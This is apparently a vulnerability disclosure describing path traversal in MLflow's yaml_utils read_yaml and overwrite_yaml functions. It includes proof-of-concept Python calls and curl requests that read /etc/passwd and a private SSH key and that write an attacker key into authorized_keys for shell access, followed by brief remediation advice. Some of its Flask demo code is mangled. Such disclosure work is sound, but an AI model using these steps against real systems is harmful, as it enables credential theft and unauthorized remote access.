<!--# Path Traversal to RCE

<img width="1815" height="1213" alt="image" src="https://github.com/user-attachments/assets/f012d214-ba0f-4689-b169-4fd51810bf94" />

# Description

Once install the library, I have observed read_yaml and overwrite_yaml functions under utils.yaml_utils module. These functions are basically for read and write the local yaml files and load the yaml file's content and return the output. These functions are vulnerable to path traversal due to lacks of extension validation and file path normalization.

The below code is explain how the read yaml process is going on, it requires 2 arguments which are 

* The file directory. 
* The file name. 

Then it combine the directory and the file name to get the absolute path then return the output of the yaml code (If it isn't yaml code, it will print the file content as it).

```
print(mlflow.utils.yaml_utils.read_yaml("/var/www/html/project/","../../../../../../../../../../etc/passwd"))  # That will print the content of passwd file.
```

```

def read_yaml(root, file_name):
    """Read data from yaml file and return as dictionary
    Args:
        root: Directory name.
        file_name: File name. Expects to have '.yaml' extension.

    Returns:
        Data in yaml file as dictionary.
    """
    if not exists(root):
        raise MissingConfigException(
            f"Cannot read '{file_name}'. Parent dir '{root}' does not exist."
        )

    file_path = os.path.join(root, file_name)
    if not exists(file_path):
        raise MissingConfigException(f"Yaml file '{file_path}' does not exist.")
    with codecs.open(file_path, mode="r", encoding=ENCODING) as yaml_file:
        return yaml.load(yaml_file, Loader=YamlSafeLoader)

```

The Second code below is the code of the overwrite_yaml function. it requires 3 arguments which are 
* The file directory.
* The file name.
* The new file data to write.

Then it combine the directory and the file name to get the absolute path then write the given data parameter content.

```
data = "ssh-ed25519 AAAAC3Nz..........................MY3ge mohamed-abdelhady@Hostname"
mlflow.utils.yaml_utils.overwrite_yaml("/var/www/html/project/","../../../../../../../../../../../home/user/.ssh/authorized_keys",data)
```

```
def overwrite_yaml(root, file_name, data, ensure_yaml_extension=True):

  """Safely overwrites a preexisting yaml file, ensuring that file contents are not deleted or corrupted if the write fails.
  This is achieved by writing contents to a temporary file and moving the temporary file to replace the preexisting file, rather than opening the preexisting file for a direct write.

Args:
    root: Directory name.
    file_name: File name.
    data: The data to write, represented as a dictionary.
    ensure_yaml_extension: If True, Will automatically add .yaml extension if not given.
"""
tmp_file_path = None
original_file_path = os.path.join(root, file_name)
original_file_mode = os.stat(original_file_path).st_mode
try:
    tmp_file_fd, tmp_file_path = tempfile.mkstemp(suffix="file.yaml")
    os.close(tmp_file_fd)
    write_yaml(
        root=get_parent_dir(tmp_file_path),
        file_name=os.path.basename(tmp_file_path),
        data=data,
        overwrite=True,
        sort_keys=True,
        ensure_yaml_extension=ensure_yaml_extension,
    )
    shutil.move(tmp_file_path, original_file_path)
    # restores original file permissions, see https://docs.python.org/3/library/tempfile.html#tempfile.mkstemp
    os.chmod(original_file_path, original_file_mode)
finally:
    if tmp_file_path is not None and os.path.exists(tmp_file_path):
        os.remove(tmp_file_path)
```


# POC

1. Create a `poc.py` file with the following code to use the `read_yaml`.
This code will print the content of /etc/passwd file without file extension validation.

```
import mlflow

print(mlflow.utils.yaml_utils.read_yaml("/var/www/html/project/","../../../../../../../../../etc/passwd"))
```

2. Modify the same file to use the `overwrite_yaml` function as documented in the below code.

```
import mlflow

data = "ssh-ed25519 AAAAC3NzaC1lZDI.................8w5VuYZBhQMY3ge mohamed-abdelhady@Hostname"
mlflow.utils.yaml_utils.overwrite_yaml("/var/www/html/project/","../../../../../../../../home/user/.ssh/authorized_key",data)
```

# Exploit/Chain both to get RCE

Assume we have a python server running that use the both functions to read and overwrite yaml files

1. Read the passwd file to get the users.
```curl "http://127.0.0.1:8000/read-file?filename=../../../../../../../../etc/passwd"```

2. Read the user .ssh id_rsa
`curl "http://127.0.0.1:8000/read-file?filename=../../../../../../../../home/user/.ssh/id_ed25519"`

3. Overwrite on the authorized_keys file to add your ssh key after generate it using (ssh-keygen)
`curl -X POST "http://127.0.0.1:8000/overwrite-file" --data "filename=../../../../../../../../home/user/.ssh/authorized_keys&content=ssh-ed25519+AAAAC3Nz...........d8w5VuYZBhQMY3ge+mohamed-abdelhady@Hostname"`


4. Then you can get ssh shell


```
from flask import Flask, request import mlflow

app = Flask(name)

APPLICATION_PATH = "/var/www/html/project/"

@app.get("/read-file") def read_file(): filename = request.args.get("filename")

if not filename:
    return "Missing filename parameter", 400

try:
    data = mlflow.utils.yaml_utils.read_yaml(APPLICATION_PATH, filename)
    return str(data), 200
except Exception as e:
    return str(e), 500

@app.post("/overwrite-file") def overwrite_file(): filename = request.form.get("filename") filecontent = request.form.get("content")

if not filename or filecontent is None:
    return "Missing filename or content parameter", 400

try:
    mlflow.utils.yaml_utils.overwrite_yaml(
        APPLICATION_PATH,
        filename,
        filecontent
    )
    return "YAML file overwritten successfully", 200
except Exception as e:
    return str(e), 500

if name == "main": app.run(host="0.0.0.0", port=8000)
```


# Remediation

read_yaml() and overwrite_yaml()

1. Enforce Strict Filename Policy by validate on the file extension.
2. Normalize and Validate the Final Path.
-->
